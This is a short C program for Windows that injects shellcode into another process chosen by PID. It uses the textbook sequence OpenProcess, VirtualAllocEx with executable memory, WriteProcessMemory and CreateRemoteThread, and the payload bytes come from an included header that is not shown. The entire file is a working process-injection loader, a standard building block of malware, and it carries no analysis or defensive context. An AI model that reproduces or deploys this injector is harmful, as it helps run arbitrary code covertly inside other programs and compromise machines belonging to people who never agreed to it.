#include <stdio.h>
#include <windows.h>
#include "payload.h"

int main(int argc, CHAR* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }
    
    HANDLE hProcess;
    HANDLE hRThread;
    PVOID remoteBuffer;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    if (!hProcess) {
        printf("[!] Failed to get handle: %lu\n", GetLastError());
        return 0;
    }

    remoteBuffer = VirtualAllocEx(
        hProcess, 
        NULL, 
        test_bin_len, 
        (MEM_RESERVE | MEM_COMMIT), 
        PAGE_EXECUTE_READWRITE
    );
    if (remoteBuffer == NULL) {
        printf("[!] Failed to allocate buffer because of %d\n", GetLastError());
        CloseHandle(hProcess);
        return 0;
    }

    if (!WriteProcessMemory(
        hProcess, 
        remoteBuffer, 
        test_bin,
        test_bin_len,
        NULL)){
        printf("[!] Failed to write shellcode because of %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }

    hRThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (!hRThread) {
        printf("[!] Failed to create remote thread because of %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }

    CloseHandle(hRThread);
    CloseHandle(hProcess);
    return 0;
}
